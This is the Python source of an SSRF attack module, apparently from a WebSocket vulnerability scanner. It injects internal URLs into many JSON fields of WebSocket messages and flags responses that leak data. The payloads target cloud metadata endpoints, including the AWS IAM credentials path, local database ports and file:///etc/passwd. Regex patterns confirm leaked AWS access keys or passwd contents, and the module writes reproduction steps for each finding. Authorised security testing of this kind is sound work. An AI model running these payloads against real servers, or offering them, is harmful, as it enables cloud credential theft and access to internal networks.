"""
SSRF via WebSocket Attack Module
Server-Side Request Forgery — makes server request internal resources.
Tests cloud metadata, internal services, localhost.
"""
import asyncio
import json
import re
from core.scanner import ws_connect, send_recv
from core.findings import store
from utils.evidence import Evidence
from utils.logger import log


# ── SSRF Payloads ─────────────────────────────────────────────────────────────
SSRF_TARGETS = [
    # Cloud metadata endpoints
    ('http://169.254.169.254/latest/meta-data/',           'AWS metadata'),
    ('http://169.254.169.254/latest/meta-data/iam/security-credentials/', 'AWS IAM credentials'),
    ('http://metadata.google.internal/computeMetadata/v1/', 'GCP metadata'),
    ('http://169.254.169.254/metadata/v1/',                'DigitalOcean metadata'),
    ('http://100.100.100.200/latest/meta-data/',           'Alibaba Cloud metadata'),

    # Internal services
    ('http://localhost/',                                   'localhost HTTP'),
    ('http://localhost:8080/',                             'localhost:8080'),
    ('http://127.0.0.1/',                                  '127.0.0.1'),
    ('http://127.0.0.1:6379/',                             'Redis on localhost'),
    ('http://127.0.0.1:5432/',                             'PostgreSQL on localhost'),
    ('http://127.0.0.1:3306/',                             'MySQL on localhost'),
    ('http://127.0.0.1:27017/',                            'MongoDB on localhost'),
    ('http://internal-api/',                               'internal-api hostname'),
    ('http://db.internal/',                                'db.internal hostname'),

    # File protocol
    ('file:///etc/passwd',                                 'file:///etc/passwd'),
    ('file:///etc/hosts',                                  'file:///etc/hosts'),
    ('file:///proc/version',                               'file:///proc/version'),
]

# Fields to inject SSRF payload into
SSRF_FIELDS = [
    'url', 'uri', 'href', 'link', 'src', 'source',
    'host', 'server', 'endpoint', 'target', 'redirect',
    'callback', 'webhook', 'fetch', 'proxy', 'load',
    'image', 'avatar', 'icon', 'resource',
]

# Patterns that confirm SSRF worked
SSRF_CONFIRMED = [
    # AWS metadata
    (r'ami-id|instance-id|instance-type|local-ipv4|public-ipv4', 'AWS metadata returned'),
    (r'AccessKeyId|SecretAccessKey|Token|Expiration',            'AWS credentials leaked'),
    # GCP metadata
    (r'computeMetadata|project-id|numeric-project-id',           'GCP metadata returned'),
    # Generic internal
    (r'root:.*?:0:0:',                                           '/etc/passwd content'),
    (r'127\.0\.0\.1\s+localhost',                                '/etc/hosts content'),
    (r'Linux version \d+\.\d+',                                  '/proc/version content'),
    (r'"hostname"\s*:',                                          'internal hostname returned'),
    # Redis response
    (r'\+PONG|\-ERR',                                            'Redis response'),
    # Database error (proves internal connection)
    (r'mysql|postgresql|mongodb|redis|connection refused',       'internal service connection'),
    # Server connected but got HTML/error from internal
    (r'<html|<!DOCTYPE|Apache|nginx|IIS',                        'internal HTTP response'),
]


async def test_ssrf(ws_url: str, fast_mode: bool = False) -> bool:
    """
    SSRF Test:
    Inject internal URLs into WebSocket messages.
    If server fetches the URL and returns content = SSRF confirmed.
    """
    found_any = False
    targets = SSRF_TARGETS[:6] if fast_mode else SSRF_TARGETS

    try:
        async with await ws_connect(ws_url, timeout=6) as ws:
            for target_url, target_name in targets:
                for field in SSRF_FIELDS[:5] if fast_mode else SSRF_FIELDS:
                    try:
                        msg = json.dumps({field: target_url})
                        resp = await send_recv(ws, msg, timeout=5)
                        if not resp:
                            continue

                        # Check if server returned internal content
                        for pattern, proof_label in SSRF_CONFIRMED:
                            if re.search(pattern, resp, re.IGNORECASE | re.DOTALL):
                                ev = Evidence.make(
                                    payload=msg,
                                    request=f"Injected SSRF URL into field '{field}': {target_url}",
                                    response=resp[:500],
                                    proof=f"SSRF confirmed: server fetched '{target_name}' and returned content. Pattern matched: {proof_label}",
                                    reproduce=(
                                        f"1. Connect to {ws_url}\n"
                                        f"2. Send: {msg}\n"
                                        f"3. Server fetches {target_url}\n"
                                        f"4. Internal content returned in response"
                                    ),
                                    ssrf_target=target_url,
                                    ssrf_field=field,
                                )

                                severity = 'CRITICAL' if any(x in target_name for x in [
                                    'credentials', 'passwd', 'IAM'
                                ]) else 'HIGH'

                                store.add(
                                    ws_url,
                                    f'SSRF via WebSocket — {target_name}',
                                    severity,
                                    f"Server-Side Request Forgery confirmed.\n"
                                    f"Server fetched internal resource: {target_url}\n"
                                    f"Field used: '{field}'\n"
                                    f"Content leaked: {proof_label}\n"
                                    f"Impact: internal network access, cloud credential theft.",
                                    ev
                                )
                                found_any = True
                                log.warning(f"SSRF confirmed: {target_name} on {ws_url}")
                                return found_any  # Stop on first confirmed SSRF

                    except asyncio.TimeoutError:
                        # Timeout on SSRF target = server is trying to connect = partial SSRF
                        ev = Evidence.make(
                            payload=json.dumps({field: target_url}),
                            proof=f"SSRF partial: server timed out trying to connect to {target_url}. Indicates server is making outbound request.",
                            reproduce=(
                                f"1. Connect to {ws_url}\n"
                                f"2. Send: {json.dumps({field: target_url})}\n"
                                f"3. Connection times out — server is attempting to fetch internal URL"
                            )
                        )
                        store.add(
                            ws_url,
                            'SSRF via WebSocket (Partial — Timeout)',
                            'HIGH',
                            f"Partial SSRF: server timed out connecting to {target_url}.\n"
                            f"Server is making outbound requests based on user input.",
                            ev
                        )
                        found_any = True
                    except Exception:
                        continue

    except Exception as e:
        log.debug(f"SSRF test error on {ws_url}: {e}")

    return found_any
